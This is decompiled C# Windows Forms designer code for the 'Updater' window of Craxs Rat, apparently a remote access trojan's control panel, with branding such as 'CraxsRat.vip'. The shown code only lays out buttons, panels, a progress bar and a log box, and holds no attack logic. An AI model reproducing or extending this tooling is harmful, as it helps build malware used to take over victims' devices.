using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class Updater : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("downloadworker")]
	internal virtual BackgroundWorker downloadworker
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("finishbtn")]
	internal virtual DrakeUIButtonIcon finishbtn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("workprogressbar")]
	internal virtual DrakeUIProcessBar workprogressbar
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("downnumbertext")]
	internal virtual Label downnumbertext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("workingpanel")]
	internal virtual Panel workingpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("logwork")]
	internal virtual TextBox logwork
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIAvatar1")]
	internal virtual DrakeUIAvatar DrakeUIAvatar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("toppanel")]
	internal virtual Panel toppanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("laterbtn")]
	internal virtual DrakeUIButtonIcon laterbtn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("strtbtn")]
	internal virtual DrakeUIButtonIcon strtbtn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel3")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel2")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dscptext")]
	internal virtual TextBox dscptext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel1")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox3")]
	internal virtual PictureBox PictureBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("infopanel")]
	internal virtual DrakeUIGradientPanel infopanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("containerpanel")]
	internal virtual Panel containerpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Updater()
	{
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Craxs_Rat.Updater));
		this.downloadworker = new System.ComponentModel.BackgroundWorker();
		this.finishbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.workprogressbar = new DrakeUI.Framework.DrakeUIProcessBar();
		this.downnumbertext = new System.Windows.Forms.Label();
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.workingpanel = new System.Windows.Forms.Panel();
		this.logwork = new System.Windows.Forms.TextBox();
		this.Label1 = new System.Windows.Forms.Label();
		this.DrakeUIAvatar1 = new DrakeUI.Framework.DrakeUIAvatar();
		this.toppanel = new System.Windows.Forms.Panel();
		this.laterbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.strtbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.DrakeUISymbolLabel3 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.DrakeUISymbolLabel2 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.dscptext = new System.Windows.Forms.TextBox();
		this.DrakeUISymbolLabel1 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.PictureBox3 = new System.Windows.Forms.PictureBox();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.infopanel = new DrakeUI.Framework.DrakeUIGradientPanel();
		this.containerpanel = new System.Windows.Forms.Panel();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		this.workingpanel.SuspendLayout();
		this.toppanel.SuspendLayout();
		this.Panel3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox3).BeginInit();
		this.Panel2.SuspendLayout();
		this.infopanel.SuspendLayout();
		this.containerpanel.SuspendLayout();
		base.SuspendLayout();
		this.finishbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.finishbtn.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.finishbtn.FillColor = System.Drawing.Color.Black;
		this.finishbtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.finishbtn.Location = new System.Drawing.Point(0, 795);
		this.finishbtn.Name = "finishbtn";
		this.finishbtn.RectColor = System.Drawing.Color.FromArgb(193, 2, 5);
		this.finishbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.finishbtn.Size = new System.Drawing.Size(670, 61);
		this.finishbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.finishbtn.StyleCustomMode = true;
		this.finishbtn.Symbol = 61510;
		this.finishbtn.TabIndex = 3;
		this.finishbtn.Text = "Finish";
		this.finishbtn.Visible = false;
		this.workprogressbar.Dock = System.Windows.Forms.DockStyle.Top;
		this.workprogressbar.FillColor = System.Drawing.Color.Transparent;
		this.workprogressbar.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.workprogressbar.ForeColor = System.Drawing.Color.White;
		this.workprogressbar.Location = new System.Drawing.Point(0, 334);
		this.workprogressbar.MinimumSize = new System.Drawing.Size(70, 23);
		this.workprogressbar.Name = "workprogressbar";
		this.workprogressbar.RectColor = System.Drawing.Color.FromArgb(193, 2, 5);
		this.workprogressbar.ShowValue = false;
		this.workprogressbar.Size = new System.Drawing.Size(670, 29);
		this.workprogressbar.Style = DrakeUI.Framework.UIStyle.Custom;
		this.workprogressbar.StyleCustomMode = true;
		this.workprogressbar.TabIndex = 1;
		this.workprogressbar.Text = "0.0%";
		this.downnumbertext.BackColor = System.Drawing.Color.Transparent;
		this.downnumbertext.Dock = System.Windows.Forms.DockStyle.Top;
		this.downnumbertext.Font = new System.Drawing.Font("Segoe UI Black", 25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.downnumbertext.ForeColor = System.Drawing.Color.FromArgb(193, 2, 5);
		this.downnumbertext.Location = new System.Drawing.Point(0, 273);
		this.downnumbertext.Name = "downnumbertext";
		this.downnumbertext.Size = new System.Drawing.Size(670, 61);
		this.downnumbertext.TabIndex = 4;
		this.downnumbertext.Text = "Please Wait...";
		this.downnumbertext.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.downnumbertext.Visible = false;
		this.PictureBox1.Dock = System.Windows.Forms.DockStyle.Top;
		this.PictureBox1.Image = (System.Drawing.Image)resources.GetObject("PictureBox1.Image");
		this.PictureBox1.Location = new System.Drawing.Point(0, 0);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(670, 273);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox1.TabIndex = 0;
		this.PictureBox1.TabStop = false;
		this.workingpanel.BackColor = System.Drawing.Color.Black;
		this.workingpanel.Controls.Add(this.logwork);
		this.workingpanel.Controls.Add(this.finishbtn);
		this.workingpanel.Controls.Add(this.workprogressbar);
		this.workingpanel.Controls.Add(this.downnumbertext);
		this.workingpanel.Controls.Add(this.PictureBox1);
		this.workingpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.workingpanel.Location = new System.Drawing.Point(0, 0);
		this.workingpanel.Name = "workingpanel";
		this.workingpanel.Size = new System.Drawing.Size(670, 856);
		this.workingpanel.TabIndex = 7;
		this.logwork.BackColor = System.Drawing.Color.Black;
		this.logwork.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.logwork.Dock = System.Windows.Forms.DockStyle.Fill;
		this.logwork.Font = new System.Drawing.Font("Roboto Light", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.logwork.ForeColor = System.Drawing.Color.FromArgb(193, 2, 5);
		this.logwork.Location = new System.Drawing.Point(0, 363);
		this.logwork.Multiline = true;
		this.logwork.Name = "logwork";
		this.logwork.Size = new System.Drawing.Size(670, 432);
		this.logwork.TabIndex = 2;
		this.Label1.Dock = System.Windows.Forms.DockStyle.Left;
		this.Label1.ForeColor = System.Drawing.Color.FromArgb(193, 2, 5);
		this.Label1.Location = new System.Drawing.Point(0, 0);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(179, 43);
		this.Label1.TabIndex = 2;
		this.Label1.Text = "Craxs Rat Updater";
		this.Label1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.DrakeUIAvatar1.AvatarSize = 35;
		this.DrakeUIAvatar1.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIAvatar1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.DrakeUIAvatar1.ForeColor = System.Drawing.Color.FromArgb(193, 2, 5);
		this.DrakeUIAvatar1.Location = new System.Drawing.Point(621, 0);
		this.DrakeUIAvatar1.Name = "DrakeUIAvatar1";
		this.DrakeUIAvatar1.Size = new System.Drawing.Size(49, 43);
		this.DrakeUIAvatar1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar1.StyleCustomMode = true;
		this.DrakeUIAvatar1.Symbol = 61453;
		this.DrakeUIAvatar1.SymbolSize = 25;
		this.DrakeUIAvatar1.TabIndex = 1;
		this.DrakeUIAvatar1.Text = "DrakeUIAvatar1";
		this.toppanel.BackColor = System.Drawing.Color.Black;
		this.toppanel.Controls.Add(this.Label1);
		this.toppanel.Controls.Add(this.DrakeUIAvatar1);
		this.toppanel.Dock = System.Windows.Forms.DockStyle.Top;
		this.toppanel.Location = new System.Drawing.Point(0, 0);
		this.toppanel.Name = "toppanel";
		this.toppanel.Size = new System.Drawing.Size(670, 43);
		this.toppanel.TabIndex = 8;
		this.laterbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.laterbtn.FillColor = System.Drawing.Color.Black;
		this.laterbtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.laterbtn.Location = new System.Drawing.Point(12, 18);
		this.laterbtn.Name = "laterbtn";
		this.laterbtn.RectColor = System.Drawing.Color.FromArgb(193, 2, 5);
		this.laterbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.laterbtn.Size = new System.Drawing.Size(135, 58);
		this.laterbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.laterbtn.StyleCustomMode = true;
		this.laterbtn.Symbol = 61730;
		this.laterbtn.TabIndex = 1;
		this.laterbtn.Text = "Later";
		this.strtbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.strtbtn.FillColor = System.Drawing.Color.Black;
		this.strtbtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.strtbtn.Location = new System.Drawing.Point(523, 18);
		this.strtbtn.Name = "strtbtn";
		this.strtbtn.RectColor = System.Drawing.Color.FromArgb(193, 2, 5);
		this.strtbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.strtbtn.Size = new System.Drawing.Size(135, 58);
		this.strtbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.strtbtn.StyleCustomMode = true;
		this.strtbtn.TabIndex = 0;
		this.strtbtn.Text = "Start";
		this.Panel3.BackColor = System.Drawing.Color.Black;
		this.Panel3.Controls.Add(this.laterbtn);
		this.Panel3.Controls.Add(this.strtbtn);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel3.Location = new System.Drawing.Point(0, 730);
		this.Panel3.Name = "Panel3";
		this.Panel3.Size = new System.Drawing.Size(670, 100);
		this.Panel3.TabIndex = 9;
		this.DrakeUISymbolLabel3.BackColor = System.Drawing.Color.Black;
		this.DrakeUISymbolLabel3.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeUISymbolLabel3.Font = new System.Drawing.Font("Roboto Light", 12f);
		this.DrakeUISymbolLabel3.ForeColor = System.Drawing.Color.FromArgb(193, 2, 5);
		this.DrakeUISymbolLabel3.Location = new System.Drawing.Point(0, 830);
		this.DrakeUISymbolLabel3.Name = "DrakeUISymbolLabel3";
		this.DrakeUISymbolLabel3.Padding = new System.Windows.Forms.Padding(28, 0, 0, 0);
		this.DrakeUISymbolLabel3.Size = new System.Drawing.Size(670, 26);
		this.DrakeUISymbolLabel3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUISymbolLabel3.StyleCustomMode = true;
		this.DrakeUISymbolLabel3.Symbol = 61819;
		this.DrakeUISymbolLabel3.SymbolColor = System.Drawing.Color.FromArgb(193, 2, 5);
		this.DrakeUISymbolLabel3.TabIndex = 10;
		this.DrakeUISymbolLabel3.Text = "CraxsRat.vip";
		this.DrakeUISymbolLabel2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeUISymbolLabel2.Font = new System.Drawing.Font("Roboto Light", 12f);
		this.DrakeUISymbolLabel2.ForeColor = System.Drawing.Color.FromArgb(193, 2, 5);
		this.DrakeUISymbolLabel2.Location = new System.Drawing.Point(0, 374);
		this.DrakeUISymbolLabel2.Name = "DrakeUISymbolLabel2";
		this.DrakeUISymbolLabel2.Padding = new System.Windows.Forms.Padding(28, 0, 0, 0);
		this.DrakeUISymbolLabel2.Size = new System.Drawing.Size(670, 26);
		this.DrakeUISymbolLabel2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUISymbolLabel2.StyleCustomMode = true;
		this.DrakeUISymbolLabel2.Symbol = 61736;
		this.DrakeUISymbolLabel2.SymbolColor = System.Drawing.Color.FromArgb(193, 2, 5);
		this.DrakeUISymbolLabel2.TabIndex = 5;
		this.DrakeUISymbolLabel2.Text = "What New";
		this.dscptext.BackColor = System.Drawing.Color.Black;
		this.dscptext.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.dscptext.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.dscptext.Font = new System.Drawing.Font("Roboto Light", 12f);
		this.dscptext.ForeColor = System.Drawing.Color.White;
		this.dscptext.Location = new System.Drawing.Point(0, 400);
		this.dscptext.Multiline = true;
		this.dscptext.Name = "dscptext";
		this.dscptext.ReadOnly = true;
		this.dscptext.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.dscptext.Size = new System.Drawing.Size(670, 456);
		this.dscptext.TabIndex = 6;
		this.DrakeUISymbolLabel1.Font = new System.Drawing.Font("Roboto Light", 25f);
		this.DrakeUISymbolLabel1.ForeColor = System.Drawing.Color.White;
		this.DrakeUISymbolLabel1.Location = new System.Drawing.Point(121, 214);
		this.DrakeUISymbolLabel1.Name = "DrakeUISymbolLabel1";
		this.DrakeUISymbolLabel1.Padding = new System.Windows.Forms.Padding(28, 0, 0, 0);
		this.DrakeUISymbolLabel1.Size = new System.Drawing.Size(440, 143);
		this.DrakeUISymbolLabel1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUISymbolLabel1.StyleCustomMode = true;
		this.DrakeUISymbolLabel1.Symbol = 61699;
		this.DrakeUISymbolLabel1.SymbolColor = System.Drawing.Color.White;
		this.DrakeUISymbolLabel1.TabIndex = 4;
		this.DrakeUISymbolLabel1.Text = "Craxs Rat Updates";
		this.PictureBox3.Image = Craxs_Rat.My.Resources.Resources.LOGO;
		this.PictureBox3.Location = new System.Drawing.Point(261, 49);
		this.PictureBox3.Name = "PictureBox3";
		this.PictureBox3.Size = new System.Drawing.Size(161, 159);
		this.PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox3.TabIndex = 2;
		this.PictureBox3.TabStop = false;
		this.Panel2.Controls.Add(this.DrakeUISymbolLabel2);
		this.Panel2.Controls.Add(this.dscptext);
		this.Panel2.Controls.Add(this.DrakeUISymbolLabel1);
		this.Panel2.Controls.Add(this.PictureBox3);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel2.Location = new System.Drawing.Point(0, 0);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(670, 856);
		this.Panel2.TabIndex = 5;
		this.infopanel.BackColor = System.Drawing.Color.Black;
		this.infopanel.Controls.Add(this.Panel2);
		this.infopanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.infopanel.FillColor = System.Drawing.Color.Black;
		this.infopanel.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.infopanel.ForeColor = System.Drawing.Color.Silver;
		this.infopanel.Location = new System.Drawing.Point(0, 0);
		this.infopanel.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.infopanel.Name = "infopanel";
		this.infopanel.RectColor = System.Drawing.Color.FromArgb(130, 130, 130);
		this.infopanel.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.infopanel.Size = new System.Drawing.Size(670, 856);
		this.infopanel.Style = DrakeUI.Framework.UIStyle.Custom;
		this.infopanel.TabIndex = 0;
		this.infopanel.Text = null;
		this.infopanel.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.containerpanel.BackColor = System.Drawing.Color.Black;
		this.containerpanel.Controls.Add(this.infopanel);
		this.containerpanel.Controls.Add(this.workingpanel);
		this.containerpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.containerpanel.Location = new System.Drawing.Point(0, 0);
		this.containerpanel.Name = "containerpanel";
		this.containerpanel.Size = new System.Drawing.Size(670, 856);
		this.containerpanel.TabIndex = 11;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(670, 856);
		base.Controls.Add(this.toppanel);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.DrakeUISymbolLabel3);
		base.Controls.Add(this.containerpanel);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Name = "Updater";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Updater";
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		this.workingpanel.ResumeLayout(false);
		this.workingpanel.PerformLayout();
		this.toppanel.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.PictureBox3).EndInit();
		this.Panel2.ResumeLayout(false);
		this.Panel2.PerformLayout();
		this.infopanel.ResumeLayout(false);
		this.containerpanel.ResumeLayout(false);
		base.ResumeLayout(false);
	}
}
